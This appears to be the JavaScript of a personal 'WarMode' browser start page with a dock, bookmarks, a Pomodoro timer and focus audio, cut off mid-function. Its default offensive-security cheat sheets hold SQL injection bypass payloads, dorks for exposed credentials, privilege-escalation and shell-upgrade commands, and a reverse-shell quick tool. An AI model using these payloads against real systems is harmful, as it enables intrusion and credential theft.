let isPomodoroActive = false;
let pomodoroTimer = null;
let pomodoroSeconds = 25 * 60;
let clockLoopStarted = false;
let isEditMode = false;
let activeCheatKey = null;

/* =========================================
   0. SECURITY & CORE UTILITIES (XSS-SAFE)
   ========================================= */
function escapeHTML(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

const FALLBACK_ICON = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%233fd9e8' stroke-width='2'%3E%3Ccircle cx='12' cy='12' r='9'/%3E%3Cpath d='M3.6 9h16.8M3.6 15h16.8M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18'/%3E%3C/svg%3E";

function safeHostname(url) {
    try { return new URL(url).hostname; } catch (e) { return 'google.com'; }
}

function safeLoadJSON(key, fallback) {
    try {
        const raw = localStorage.getItem(key);
        if (!raw) return JSON.parse(JSON.stringify(fallback));
        const parsed = JSON.parse(raw);
        if (Array.isArray(fallback)) {
            if (!Array.isArray(parsed) || parsed.length === 0) return JSON.parse(JSON.stringify(fallback));
        }
        return parsed;
    } catch (e) {
        return JSON.parse(JSON.stringify(fallback));
    }
}

function showToast(msg) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(window._toastTimer);
    window._toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
}

function copyText(text, label = "Copied to clipboard") {
    navigator.clipboard.writeText(text).then(() => showToast(`✔ ${label}`));
}

/* =========================================
   1. DYNAMIC CHEAT-SHEETS & INSTANT TOOLS ENGINE
   ========================================= */
const defaultCheatSheets = {
    "dorks": "GOOGLE DORKS CHEAT-SHEET:\n• site:example.com -> Limit search to a site\n• intitle:\"index of\" -> Find open directories\n• filetype:pdf / ext:sql -> Find specific extensions\n• inurl:admin / inurl:login -> Find admin panels\n• cache:example.com -> View Google's cached version\n• intext:\"password\" ext:env -> Find exposed .env files",
    "sql": "SQLi & SQL CHEAT-SHEET:\n• ' OR 1=1-- -> Basic auth bypass\n• UNION SELECT null, user()-- -> Enum columns/data\n• SELECT * FROM t WHERE x=1 -> Read rows\n• JOIN t2 ON t.id=t2.id -> Combine tables\n• GROUP BY col HAVING COUNT(*)>1 -> Aggregate\n• ORDER BY col DESC LIMIT 10 -> Top rows",
    "linux": "LINUX / OFFSEC CHEAT-SHEET:\n• sudo -l -> Check sudo privileges\n• find / -perm -4000 2>/dev/null -> Find SUID binaries\n• crontab -l / cat /etc/crontab -> Check cron jobs\n• grep -rnw '/path' -e 'password' -> Search text deeply\n• ss -tulpn / netstat -tulpn -> Active listening ports\n• tar -czvf archive.tar.gz /folder -> Compress",
    "privesc": "LINUX PRIVESC CHECKLIST:\n• uname -a && cat /etc/os-release -> Kernel & OS\n• find / -writable -type d 2>/dev/null -> Writable dirs\n• getcap -r / 2>/dev/null -> File capabilities\n• cat ~/.bash_history -> Historical creds\n• ls -la /etc/passwd /etc/shadow -> File permissions\n• pspy64 -> Monitor processes without root",
    "nmap": "NMAP OFFSEC CHEAT-SHEET:\n• nmap -sC -sV -oA scan <ip> -> Default script & version\n• nmap -p- --min-rate 1000 <ip> -> Fast full port scan\n• nmap -sU --top-ports 100 <ip> -> Top UDP ports\n• nmap -Pn <ip> -> Skip host discovery (Ping block)",
    "docker": "DOCKER CHEAT-SHEET:\n• docker ps -a -> List all containers\n• docker run -it --rm <img_name> /bin/bash -> Run interactive\n• docker exec -it <id> sh -> Shell into running container\n• docker build -t name . -> Build image from Dockerfile",
    "python": "PYTHON CHEAT-SHEET:\n• python3 -m http.server 8000 -> Quick web server\n• python3 -m venv .venv -> Create Virtual env\n• pip install -r requirements.txt -> Install deps\n• python3 -c 'import pty;pty.spawn(\"/bin/bash\")' -> TTY upgrade",
    "git": "GIT CHEAT-SHEET:\n• git status -> Check changes\n• git add . && git commit -m 'msg' -> Stage & commit\n• git push origin main -> Push to remote repository\n• git log --oneline --graph -> Compact visual history\n• git reset --soft HEAD~1 -> Undo last commit, keep changes",
    "tmux": "TMUX CHEAT-SHEET:\n• tmux new -s <name> -> New session\n• Ctrl+b d -> Detach session\n• tmux a -t <name> -> Re-attach session\n• Ctrl+b % / \" -> Split pane vertically / horizontally\n• Ctrl+b [ -> Enter scroll/copy mode",
    "vim": "VIM CHEAT-SHEET:\n• :w / :q / :wq / :q! -> Save, quit, save+quit, force quit\n• gg / G -> Top / Bottom of file\n• dd / yy / p -> Cut line, Yank line, Paste\n• :%s/old/new/g -> Replace all occurrences in file\n• u / Ctrl+r -> Undo / Redo"
};

const defaultQuickTools = [
    { label: "📋 Dorks", mode: "run", cmd: "cheat dorks" },
    { label: "💉 SQLi", mode: "run", cmd: "cheat sql" },
    { label: "🐧 Linux", mode: "run", cmd: "cheat linux" },
    { label: "🔓 PrivEsc", mode: "run", cmd: "cheat privesc" },
    { label: "🔍 Nmap", mode: "run", cmd: "cheat nmap" },
    { label: "🌿 Git", mode: "run", cmd: "cheat git" },
    { label: "🐚 RevShell", mode: "run", cmd: "rev 10.10.14.2 4444" },
    { label: "🔐 Base64", mode: "fill", cmd: "b64 " },
    { label: "🔑 JWT", mode: "fill", cmd: "jwt " },
    { label: "🛡️ Hash", mode: "fill", cmd: "hash " },
    { label: "🌐 CIDR", mode: "run", cmd: "cidr 10.10.14.0/24" },
    { label: "🎲 GenPass", mode: "run", cmd: "pass 20" },
    { label: "📡 My IP", mode: "run", cmd: "ip" },
    { label: "🎯 Mission", mode: "fill", cmd: "focus " }
];

let cheatSheets = safeLoadJSON('traichu_cheats', defaultCheatSheets);
let quickTools = safeLoadJSON('traichu_quick_tools', defaultQuickTools);

function saveCheats() { localStorage.setItem('traichu_cheats', JSON.stringify(cheatSheets)); }
function saveQuickTools() { localStorage.setItem('traichu_quick_tools', JSON.stringify(quickTools)); }

let dragToolIdx = null;

function renderQuickTools() {
    const bar = document.getElementById('quick-cmd-bar');
    if (!bar) return;
    bar.innerHTML = `<span class="q-label">⚡ Instant Tools:</span>`;

    quickTools.forEach((tool, idx) => {
        const wrap = document.createElement('div');
        wrap.className = 'q-chip-wrap';
        wrap.dataset.idx = idx;
        if (window.isEditMode) wrap.draggable = true;

        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'q-chip';
        btn.textContent = tool.label;
        btn.title = window.isEditMode ? `Click to edit '${tool.cmd}'` : `Command: ${tool.cmd}`;
        btn.onclick = () => {
            if (window.isEditMode) {
                openToolModal(idx);
            } else if (tool.mode === 'fill') {
                fillQuickCmd(tool.cmd);
            } else {
                runQuickCmd(tool.cmd);
            }
        };

        const delBtn = document.createElement('button');
        delBtn.type = 'button';
        delBtn.className = 'del-tool-btn';
        delBtn.textContent = '×';
        delBtn.title = 'Remove tool';
        delBtn.onclick = (e) => {
            e.stopPropagation();
            deleteQuickTool(idx);
        };

        if (window.isEditMode) {
            wrap.addEventListener('dragstart', function(e) {
                dragToolIdx = parseInt(this.dataset.idx, 10);
                e.dataTransfer.effectAllowed = 'move';
                setTimeout(() => this.classList.add('dragging'), 0);
            });
            wrap.addEventListener('dragover', e => e.preventDefault());
            wrap.addEventListener('drop', function(e) {
                e.preventDefault();
                const targetIdx = parseInt(this.dataset.idx, 10);
                if (dragToolIdx === null || dragToolIdx === targetIdx) return;
                const moved = quickTools.splice(dragToolIdx, 1)[0];
                quickTools.splice(targetIdx, 0, moved);
                saveQuickTools();
                renderQuickTools();
            });
            wrap.addEventListener('dragend', function() { this.classList.remove('dragging'); });
        }

        wrap.appendChild(btn);
        wrap.appendChild(delBtn);
        bar.appendChild(wrap);
    });

    const addBtn = document.createElement('button');
    addBtn.type = 'button';
    addBtn.className = 'add-tool-btn';
    addBtn.innerHTML = `+ Tool / Cheat`;
    addBtn.title = 'Create your own Cheat-Sheet or Instant Tool';
    addBtn.onclick = () => openToolModal(null);
    bar.appendChild(addBtn);
}

function deleteQuickTool(idx) {
    const removed = quickTools.splice(idx, 1)[0];
    saveQuickTools();
    renderQuickTools();
    showToast(`Removed ${removed ? removed.label : 'tool'}`);
}

/* --- Custom Tool & Cheat-Sheet Modal Logic --- */
let currentToolModalMode = 'cheat'; // 'cheat' or 'cmd'

function setToolModalMode(mode) {
    currentToolModalMode = mode;
    document.getElementById('tt-cheat-btn').classList.toggle('active', mode === 'cheat');
    document.getElementById('tt-cmd-btn').classList.toggle('active', mode === 'cmd');
    const keyInput = document.getElementById('tool-key-input');
    const contentInput = document.getElementById('tool-content-input');

    if (mode === 'cheat') {
        keyInput.placeholder = "Cheat Key (e.g., rust -> runs 'cheat rust')";
        contentInput.style.display = 'block';
    } else {
        keyInput.placeholder = "Command to Run/Fill (e.g., pomo 45, rev 10.10.14.5 9001, gh )";
        contentInput.style.display = 'none';
    }
}

function openToolModal(editIdx = null, forceCheatKey = null) {
    const modal = document.getElementById('tool-modal');
    const idxInput = document.getElementById('tool-edit-idx');
    const lblInput = document.getElementById('tool-label-input');
    const keyInput = document.getElementById('tool-key-input');
    const contentInput = document.getElementById('tool-content-input');

    idxInput.value = editIdx !== null && editIdx !== undefined ? String(editIdx) : '';

    if (forceCheatKey) {
        setToolModalMode('cheat');
        const existingIdx = quickTools.findIndex(t => t.cmd.toLowerCase() === `cheat ${forceCheatKey.toLowerCase()}`);
        idxInput.value = existingIdx >= 0 ? String(existingIdx) : '';
        lblInput.value = existingIdx >= 0 ? quickTools[existingIdx].label : `📋 ${forceCheatKey.toUpperCase()}`;
        keyInput.value = forceCheatKey.toLowerCase();
        contentInput.value = cheatSheets[forceCheatKey.toLowerCase()] || '';
    } else if (editIdx !== null && quickTools[editIdx]) {
        const item = quickTools[editIdx];
        lblInput.value = item.label;
        if (item.cmd.toLowerCase().startsWith('cheat ')) {
            const cKey = item.cmd.slice(6).trim().toLowerCase();
            setToolModalMode('cheat');
            keyInput.value = cKey;
            contentInput.value = cheatSheets[cKey] || '';
        } else {
            setToolModalMode('cmd');
            keyInput.value = item.cmd;
            contentInput.value = '';
        }
    } else {
        setToolModalMode('cheat');
        lblInput.value = '';
        keyInput.value = '';
        contentInput.value = '';
    }

    modal.classList.add('show');
    lblInput.focus();
}

function closeToolModal() {
    document.getElementById('tool-modal').classList.remove('show');
}

function saveCustomTool() {
    const editIdxStr = document.getElementById('tool-edit-idx').value;
    const label = document.getElementById('tool-label-input').value.trim();
    const rawKey = document.getElementById('tool-key-input').value.trim();
    const content = document.getElementById('tool-content-input').value.trim();

    if (!label || !rawKey) {
        showToast("Please fill in both Label and Key/Command");
        return;
    }

    if (currentToolModalMode === 'cheat') {
        const cleanKey = rawKey.replace(/^cheat\s+/i, '').toLowerCase().replace(/\s+/g, '_');
        cheatSheets[cleanKey] = content || `${label.toUpperCase()} CHEAT-SHEET:\n• Add your commands here`;
        saveCheats();

        const toolObj = { label, mode: 'run', cmd: `cheat ${cleanKey}` };
        if (editIdxStr !== '') {
            quickTools[parseInt(editIdxStr, 10)] = toolObj;
        } else {
            const existing = quickTools.findIndex(t => t.cmd.toLowerCase() === `cheat ${cleanKey}`);
            if (existing >= 0) quickTools[existing] = toolObj;
            else quickTools.push(toolObj);
        }
        saveQuickTools();
        renderQuickTools();
        closeToolModal();
        runQuickCmd(`cheat ${cleanKey}`);
        showToast(`✔ Saved Cheat-Sheet: cheat ${cleanKey}`);
    } else {
        const isFill = rawKey.endsWith(' ');
        const toolObj = { label, mode: isFill ? 'fill' : 'run', cmd: rawKey };
        if (editIdxStr !== '') {
            quickTools[parseInt(editIdxStr, 10)] = toolObj;
        } else {
            quickTools.push(toolObj);
        }
        saveQuickTools();
        renderQuickTools();
        closeToolModal();
        showToast(`✔ Saved Instant Tool: ${label}`);
    }
}

function editCurrentCheatSheet() {
    if (activeCheatKey) {
        openToolModal(null, activeCheatKey);
    }
}

const commonPorts = {
    "20": "FTP Data", "21": "FTP Control", "22": "SSH", "23": "Telnet",
    "25": "SMTP", "53": "DNS", "67": "DHCP", "69": "TFTP", "80": "HTTP",
    "88": "Kerberos", "110": "POP3", "111": "RPCbind", "135": "MS-RPC",
    "139": "NetBIOS", "143": "IMAP", "161": "SNMP", "389": "LDAP",
    "443": "HTTPS", "445": "SMB", "514": "Syslog", "636": "LDAPS",
    "1433": "MSSQL", "1521": "Oracle DB", "2049": "NFS", "3306": "MySQL",
    "3389": "RDP", "5432": "PostgreSQL", "5900": "VNC", "5985": "WinRM HTTP",
    "6379": "Redis", "8080": "HTTP-Proxy", "8443": "HTTPS-Alt", "27017": "MongoDB"
};

/* =========================================
   2. DYNAMIC DOCK ENGINE (WITH AUTO-RECOVERY)
   ========================================= */
const defaultDock = [
    { name: "GitHub", url: "https://github.com", color: "var(--violet)" },
    { name: "LeetCode", url: "https://leetcode.com", color: "var(--amber)" },
    { name: "HackerRank", url: "https://www.hackerrank.com", color: "var(--green)" },
    { name: "ChatGPT", url: "https://chatgpt.com", color: "var(--cyan)" },
    { name: "Notion", url: "https://notion.so", color: "var(--text)" }
];

let dockData = safeLoadJSON('traichu_dock', defaultDock);
function saveDock() { localStorage.setItem('traichu_dock', JSON.stringify(dockData)); }

let dragDockIndex = null;

function renderDock() {
    const list = document.getElementById('dock-list');
    if (!list) return;
    list.querySelectorAll('.dynamic-dock').forEach(el => el.remove());
    const gmailLi = list.querySelector('.fixed-dock');

    dockData.forEach((item, idx) => {
        const li = document.createElement('li');
        li.className = 'dynamic-dock';
        li.dataset.idx = idx;
        if (window.isEditMode) li.draggable = true;

        li.style.setProperty('--c', item.color || 'var(--cyan)');
        const domain = safeHostname(item.url);
        const iconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=64`;

        li.innerHTML = `
            <a href="${escapeHTML(item.url)}" title="${escapeHTML(item.name)}" onclick="if(window.isEditMode){ event.preventDefault(); return false; }">
                <img src="${iconUrl}" class="dock-icon" alt="${escapeHTML(item.name)}" onerror="this.onerror=null;this.src='${FALLBACK_ICON}';">
            </a>
            <button class="del-dock-btn" onclick="deleteDockItem(${idx})">×</button>
        `;

        if (window.isEditMode) {
            li.addEventListener('dragstart', function(e) {
                dragDockIndex = parseInt(this.dataset.idx, 10);
                e.dataTransfer.effectAllowed = 'move';
                setTimeout(() => this.classList.add('dock-dragging'), 0);
            });
            li.addEventListener('dragover', function(e) { e.preventDefault(); this.classList.add('dock-drag-over'); });
            li.addEventListener('dragleave', function() { this.classList.remove('dock-drag-over'); });
            li.addEventListener('drop', function(e) {
                e.preventDefault();
                this.classList.remove('dock-drag-over');
                let targetIdx = parseInt(this.dataset.idx, 10);
                if (dragDockIndex === targetIdx) return;
                const movedItem = dockData.splice(dragDockIndex, 1)[0];
                dockData.splice(targetIdx, 0, movedItem);
                saveDock();
                renderDock();
            });
            li.addEventListener('dragend', function() { this.classList.remove('dock-dragging'); });
        }
        list.insertBefore(li, gmailLi);
    });
}

function deleteDockItem(idx) {
    dockData.splice(idx, 1);
    saveDock();
    renderDock();
}

function openDockModal() {
    document.getElementById('dock-site-name').value = '';
    document.getElementById('dock-site-url').value = '';
    document.getElementById('dock-site-color').value = '';
    document.getElementById('dock-modal').classList.add('show');
    document.getElementById('dock-site-name').focus();
}

function closeDockModal() {
    document.getElementById('dock-modal').classList.remove('show');
}

function saveDockSite() {
    const name = document.getElementById('dock-site-name').value.trim();
    let url = document.getElementById('dock-site-url').value.trim();
    let color = document.getElementById('dock-site-color').value.trim() || 'var(--cyan)';
    if (name && url) {
        if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'https://' + url;
        dockData.push({ name, url, color });
        saveDock();
        renderDock();
        closeDockModal();
    }
}

/* =========================================
   3. DYNAMIC BOOKMARKS ENGINE (4 SECTIONS)
   ========================================= */
const defaultBookmarks = [
    { title: "// CS_AND_AI", links: [ { name: "GitHub", url: "https://github.com" }, { name: "LeetCode", url: "https://leetcode.com" }, { name: "HackerRank", url: "https://www.hackerrank.com" }, { name: "Kaggle", url: "https://www.kaggle.com" }, { name: "HuggingFace", url: "https://huggingface.co" }, { name: "OnlineGDB", url: "https://www.onlinegdb.com" } ]},
    { title: "// CYBERSEC", links: [ { name: "OffSec", url: "https://www.offsec.com/" }, { name: "TryHackMe", url: "https://tryhackme.com" }, { name: "HackTheBox", url: "https://www.hackthebox.com" }, { name: "PortSwigger", url: "https://portswigger.net/web-security" }, { name: "Shodan", url: "https://www.shodan.io" } ]},
    { title: "// WEBDEV_&_DOCS", links: [ { name: "Codecademy", url: "https://www.codecademy.com" }, { name: "freeCodeCamp", url: "https://www.freecodecamp.org" }, { name: "W3Schools", url: "https://www.w3schools.com" }, { name: "WebDev List", url: "https://www.youtube.com/playlist?list=PLu0W_9lII9agS67Uits0UnJyrYiXhDS6q" }, { name: "PWIOI Attend", url: "https://app.pwioi.club/dashboard/student/attendance" }, { name: "Track Sheet", url: "https://docs.google.com/spreadsheets/d/1RnkPP_H7VByIJ49UVulB1dQ2ocnuGD3sH2WtUo8LQ3Y/edit?gid=0#gid=0" }, { name: "NotebookLM", url: "https://notebook.google.com/?pli=1" }, { name: "CodeBeautify", url: "https://codebeautify.org/" } ]},
    { title: "// AI_&_MEDIA", links: [ { name: "ChatGPT", url: "https://chatgpt.com" }, { name: "DeepSeek", url: "https://chat.deepseek.com" }, { name: "Claude AI", url: "https://claude.ai" }, { name: "Gemini", url: "https://gemini.google.com" }, { name: "Perplexity", url: "https://www.perplexity.ai/" }, { name: "YouTube", url: "https://www.youtube.com/" }, { name: "WhatsApp", url: "https://web.whatsapp.com/" }, { name: "SoundsCode", url: "https://soundscode.com/" } ]}
];

let bookmarksData = safeLoadJSON('traichu_bookmarks', defaultBookmarks);
if (!bookmarksData.some(col => col && Array.isArray(col.links) && col.links.length > 0)) {
    bookmarksData = JSON.parse(JSON.stringify(defaultBookmarks));
    localStorage.setItem('traichu_bookmarks', JSON.stringify(bookmarksData));
}
function saveBookmarks() { localStorage.setItem('traichu_bookmarks', JSON.stringify(bookmarksData)); }

function restoreDefaultSites() {
    dockData = JSON.parse(JSON.stringify(defaultDock));
    bookmarksData = JSON.parse(JSON.stringify(defaultBookmarks));
    cheatSheets = JSON.parse(JSON.stringify(defaultCheatSheets));
    quickTools = JSON.parse(JSON.stringify(defaultQuickTools));
    saveDock();
    saveBookmarks();
    saveCheats();
    saveQuickTools();
    renderDock();
    renderBookmarks();
    renderQuickTools();
    showToast("✔ All Default Sites, Dock, Tools & Cheat-Sheets Restored!");
}

let dragSource = { c: null, l: null };

function renderBookmarks() {
    const container = document.getElementById('bookmarks');
    if (!container) return;
    container.innerHTML = '';

    bookmarksData.forEach((section, cIdx) => {
        const ul = document.createElement('ul');
        ul.dataset.cidx = cIdx;

        if (isEditMode) {
            ul.addEventListener('dragover', handleDragOverUl);
            ul.addEventListener('drop', handleDropUl);
            ul.addEventListener('dragleave', () => ul.classList.remove('drag-over'));
        }

        ul.innerHTML = `
            <li class="col-title">
                <span ${isEditMode ? 'contenteditable="true"' : ''} onblur="updateColTitle(${cIdx}, this.innerText)" spellcheck="false">${escapeHTML(section.title)}</span>
                <button type="button" class="add-btn" onclick="openSiteModal(${cIdx})" title="Add new link">+</button>
            </li>
        `;

        section.links.forEach((link, lIdx) => {
            const li = document.createElement('li');
            li.className = 'bm-item';
            li.dataset.cidx = cIdx;
            li.dataset.lidx = lIdx;
            if (isEditMode) li.draggable = true;

            const domain = safeHostname(link.url);
            const iconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=64`;

            li.innerHTML = `
                <a href="${escapeHTML(link.url)}" onclick="if(window.isEditMode){ event.preventDefault(); return false; }">
                    <img src="${iconUrl}" class="favicon" alt="" onerror="this.onerror=null;this.src='${FALLBACK_ICON}';">
                    ${escapeHTML(link.name)}
                </a>
                <button type="button" class="del-btn" onclick="deleteSite(${cIdx}, ${lIdx})" title="Remove link">×</button>
            `;

            if (isEditMode) {
                li.addEventListener('dragstart', handleDragStart);
                li.addEventListener('dragover', handleDragOverLi);
                li.addEventListener('drop', handleDropLi);
                li.addEventListener('dragleave', () => li.classList.remove('drag-over-top'));
                li.addEventListener('dragend', handleDragEnd);
            }
            ul.appendChild(li);
        });
        container.appendChild(ul);
    });
}

function handleDragStart(e) {
    e.dataTransfer.effectAllowed = 'move';
    e.dataTransfer.setData('text/plain', '');
    dragSource = { c: parseInt(this.dataset.cidx, 10), l: parseInt(this.dataset.lidx, 10) };
    setTimeout(() => this.classList.add('dragging'), 0);
}
function handleDragOverLi(e) { e.preventDefault(); e.stopPropagation(); this.classList.add('drag-over-top'); }
function handleDropLi(e) {
    e.preventDefault(); e.stopPropagation();
    this.classList.remove('drag-over-top');
    moveBookmark(dragSource.c, dragSource.l, parseInt(this.dataset.cidx, 10), parseInt(this.dataset.lidx, 10));
}
function handleDragOverUl(e) { e.preventDefault(); this.classList.add('drag-over'); }
function handleDropUl(e) {
    e.preventDefault();
    this.classList.remove('drag-over');
    let targetC = parseInt(this.dataset.cidx, 10);
    moveBookmark(dragSource.c, dragSource.l, targetC, bookmarksData[targetC].links.length);
}
function handleDragEnd() {
    this.classList.remove('dragging');
    document.querySelectorAll('.drag-over-top, .drag-over').forEach(el => {
        el.classList.remove('drag-over-top', 'drag-over');
    });
}
function moveBookmark(fromC, fromL, toC, toL) {
    if (fromC === toC && fromL === toL) return;
    const item = bookmarksData[fromC].links.splice(fromL, 1)[0];
    if (fromC === toC && toL > fromL) toL--;
    bookmarksData[toC].links.splice(toL, 0, item);
    saveBookmarks(); renderBookmarks();
}

function updateColTitle(colIndex, newTitle) { bookmarksData[colIndex].title = newTitle.trim(); saveBookmarks(); }
function deleteSite(colIndex, linkIndex) { bookmarksData[colIndex].links.splice(linkIndex, 1); saveBookmarks(); renderBookmarks(); }
function openSiteModal(colIndex) {
    document.getElementById('modal-section-idx').value = colIndex;
    document.getElementById('modal-site-name').value = '';
    document.getElementById('modal-site-url').value = '';
    document.getElementById('site-modal').classList.add('show');
    document.getElementById('modal-site-name').focus();
}
function closeSiteModal() { document.getElementById('site-modal').classList.remove('show'); }
function saveNewSite() {
    const colIndex = document.getElementById('modal-section-idx').value;
    const name = document.getElementById('modal-site-name').value.trim();
    let url = document.getElementById('modal-site-url').value.trim();
    if (name && url) {
        if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'https://' + url;
        bookmarksData[colIndex].links.push({ name, url });
        saveBookmarks(); renderBookmarks(); closeSiteModal();
    }
}

/* =========================================
   4. EDIT MODE & HERO / PROMPT TEXT
   ========================================= */
window.isEditMode = isEditMode;
function toggleEditMode() {
    isEditMode = !isEditMode;
    window.isEditMode = isEditMode;
    document.body.classList.toggle('edit-mode', isEditMode);

    const btn = document.getElementById('edit-mode-btn');
    const promptUser = document.getElementById('prompt-user');
    if (isEditMode) {
        btn.classList.add('active');
        btn.innerHTML = '💾';
        btn.title = "Save Changes (⌥E)";
        document.getElementById('greeting').setAttribute('contenteditable', 'true');
        document.getElementById('subline-text').setAttribute('contenteditable', 'true');
        if (promptUser) promptUser.setAttribute('contenteditable', 'true');
        showToast("Edit Mode ON — Edit/Delete/Add Tools, Cheat-Sheets, Sites & Text");
    } else {
        btn.classList.remove('active');
        btn.innerHTML = '✏️';
        btn.title = "Enter Edit Mode (⌥E)";
        document.getElementById('greeting').removeAttribute('contenteditable');
        document.getElementById('subline-text').removeAttribute('contenteditable');
        if (promptUser) promptUser.removeAttribute('contenteditable');
        saveHeroText();
        showToast("All Customizations Saved");
    }
    renderBookmarks();
    renderDock();
    renderQuickTools();
}
function loadHeroText() {
    const g = localStorage.getItem('traichu_hero_greet');
    const s = localStorage.getItem('traichu_hero_sub');
    const p = localStorage.getItem('traichu_prompt_user');
    if (g) document.getElementById('greeting').innerText = g;
    if (s) document.getElementById('subline-text').innerText = s;
    if (p && document.getElementById('prompt-user')) document.getElementById('prompt-user').innerText = p;
}
function saveHeroText() {
    localStorage.setItem('traichu_hero_greet', document.getElementById('greeting').innerText.trim() || 'Welcome Intruder!');
    localStorage.setItem('traichu_hero_sub', document.getElementById('subline-text').innerText.trim() || 'Hack the planet. Stay focused.');
    const pu = document.getElementById('prompt-user');
    if (pu) localStorage.setItem('traichu_prompt_user', pu.innerText.trim() || 'root@offsec');
}

/* =========================================
   5. CLOCK, POMODORO 2.0 & CHIME SYNTH
   ========================================= */
function playCompletionChime() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        [528, 660, 792].forEach((freq, idx) => {
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = 'sine';
            osc.frequency.value = freq;
            gain.gain.setValueAtTime(0.001, ctx.currentTime + idx * 0.18);
            gain.gain.exponentialRampToValueAtTime(0.12, ctx.currentTime + idx * 0.18 + 0.04);
            gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + idx * 0.18 + 1.1);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start(ctx.currentTime + idx * 0.18);
            osc.stop(ctx.currentTime + idx * 0.18 + 1.15);
        });
    } catch (e) {}
}

function dateTime() {
    const clockElem = document.getElementById('clock-display');
    if (clockElem && !isPomodoroActive) {
        clockElem.innerText = new Date().toLocaleTimeString();
    }
    if (!clockLoopStarted) {
        clockLoopStarted = true;
        setInterval(dateTime, 1000);
    }
}

function resetStatus() {
    const sysStatus = document.getElementById('sys-status');
    if (sysStatus) {
        const n = getPomoCount();
        sysStatus.innerText = n ? `[SYSTEM: ACTIVE · 🍅 ${n}]` : "[SYSTEM: ACTIVE]";
        document.title = 'WarMode';
        sysStatus.style.color = "var(--ok)";
    }
    renderPomoChart();
}

function startCustomPomodoro(minutes = 25, label = "POMODORO") {
    clearInterval(pomodoroTimer);
    isPomodoroActive = true;
    pomodoroSeconds = Math.max(1, Math.round(minutes * 60));
    const sysStatus = document.getElementById('sys-status');
    const clockElem = document.getElementById('clock-display');
    if (sysStatus) {
        sysStatus.innerText = `[${label}: ${minutes}m]`;
        sysStatus.style.color = label === "BREAK" ? "var(--cyan)" : "var(--red)";
    }
    pomodoroTimer = setInterval(() => {
        pomodoroSeconds--;
        const mins = Math.floor(pomodoroSeconds / 60).toString().padStart(2, '0');
        const secs = (pomodoroSeconds % 60).toString().padStart(2, '0');
        clockElem.innerText = `⏱ ${mins}:${secs}`;
        document.title = `⏱ ${mins}:${secs} · WarMode`;
        if (pomodoroSeconds <= 0) {
            clearInterval(pomodoroTimer);
            isPomodoroActive = false;
            if (label !== "BREAK") bumpPomo();
            playCompletionChime();
            resetStatus();
            dateTime();
            showToast(label === "BREAK" ? "Break complete! Ready for WarMode." : "🍅 Focus session complete! Take a 5m break.");
        }
    }, 1000);
}

function togglePomodoro() {
    if (!isPomodoroActive) {
        startCustomPomodoro(25, "POMODORO");
        showToast("🍅 25m Focus Session Started");
    } else {
        clearInterval(pomodoroTimer);
        isPomodoroActive = false;
        resetStatus();
        dateTime();
        showToast("Timer Stopped");
    }
}

function toggleZenMode() {
    document.querySelectorAll('.zen-target').forEach(el => el.classList.toggle('zen-hidden'));
}

/* =========================================
   6. WEBAUDIO FOCUS SOUNDSCAPE ENGINE (⌥A)
   ========================================= */
let audioCtx = null;
let activeAudioNodes = [];
let audioModeIndex = 0;
const AUDIO_MODES = ["Off", "Brown Noise", "Pink Rain", "40Hz Gamma"];

function stopFocusAudio() {
    activeAudioNodes.forEach(n => {
        try { if (n.stop) n.stop(); if (n.disconnect) n.disconnect(); } catch (e) {}
    });
    activeAudioNodes = [];
}

function startFocusAudio(modeIdx) {
    stopFocusAudio();
    if (modeIdx === 0) return;
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const masterGain = audioCtx.createGain();
    masterGain.gain.value = 0.14;
    masterGain.connect(audioCtx.destination);
    activeAudioNodes.push(masterGain);

    if (modeIdx === 1 || modeIdx === 2) {
        const bufferSize = 2 * audioCtx.sampleRate;
        const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
        const output = noiseBuffer.getChannelData(0);

        if (modeIdx === 1) {
            let lastOut = 0.0;
            for (let i = 0; i < bufferSize; i++) {
                const white = Math.random() * 2 - 1;
                output[i] = (lastOut + (0.02 * white)) / 1.02;
                lastOut = output[i];
                output[i] *= 3.2;
            }
        } else {
            let b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0, b6 = 0;
            for (let i = 0; i < bufferSize; i++) {
                const white = Math.random() * 2 - 1;
                b0 = 0.99886 * b0 + white * 0.0555179;
                b1 = 0.99332 * b1 + white * 0.0750759;
                b2 = 0.96900 * b2 + white * 0.1538520;
                b3 = 0.86650 * b3 + white * 0.3104856;
                b4 = 0.55000 * b4 + white * 0.5329522;
                b5 = -0.7616 * b5 - white * 0.0168980;
                output[i] = (b0 + b1 + b2 + b3 + b4 + b5 + b6 + white * 0.5362) * 0.04;
                b6 = white * 0.115926;
            }
        }

        const whiteNoise = audioCtx.createBufferSource();
        whiteNoise.buffer = noiseBuffer;
        whiteNoise.loop = true;

        const filter = audioCtx.createBiquadFilter();
        filter.type = 'lowpass';
        filter.frequency.value = modeIdx === 1 ? 420 : 1200;

        whiteNoise.connect(filter);
        filter.connect(masterGain);
        whiteNoise.start(0);
        activeAudioNodes.push(whiteNoise, filter);
    } else if (modeIdx === 3) {
        const merger = audioCtx.createChannelMerger(2);
        const oscL = audioCtx.createOscillator();
        const oscR = audioCtx.createOscillator();
        oscL.type = 'sine';
        oscR.type = 'sine';
        oscL.frequency.value = 200;
        oscR.frequency.value = 240;

        oscL.connect(merger, 0, 0);
        oscR.connect(merger, 0, 1);
        merger.connect(masterGain);
        oscL.start();
        oscR.start();
